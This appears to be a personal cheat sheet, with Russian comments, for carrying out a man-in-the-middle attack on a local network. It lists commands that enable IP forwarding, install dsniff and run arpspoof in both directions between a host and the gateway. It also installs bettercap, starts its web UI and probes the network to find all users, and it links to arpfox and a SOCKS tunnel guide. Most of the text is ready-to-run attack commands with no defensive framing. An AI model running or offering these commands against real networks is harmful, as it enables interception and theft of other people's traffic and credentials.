sudo sysctl -w net.ipv4.ip_forward=1
sudo apt install --assume-yes dsniff
sudo arpspoof 192.168.0.150 -t 192.168.0.1
sudo  arpspoof 192.168.0.1 -t 192.168.0.150

https://github.com/bettercap/bettercap
bettercap
sudo apt install libnetfilter-queue-dev
# здесь можно поменять настрокий и логин и пароль
sudo vim /usr/local/share/bettercap/caplets/http-ui.cap
# Запускаем после настрокий логина и пароля
sudo bettercap -caplet http-ui

net.show
# найти всех пользователей
net.probe on

https://hackware.ru/?p=5022

### golang aprfox

- https://github.com/malfunkt/arpfox

### ssh SOCKS 5 socks5 proxy

- https://www.digitalocean.com/community/tutorials/how-to-route-web-traffic-securely-without-a-vpn-using-a-socks-tunnel
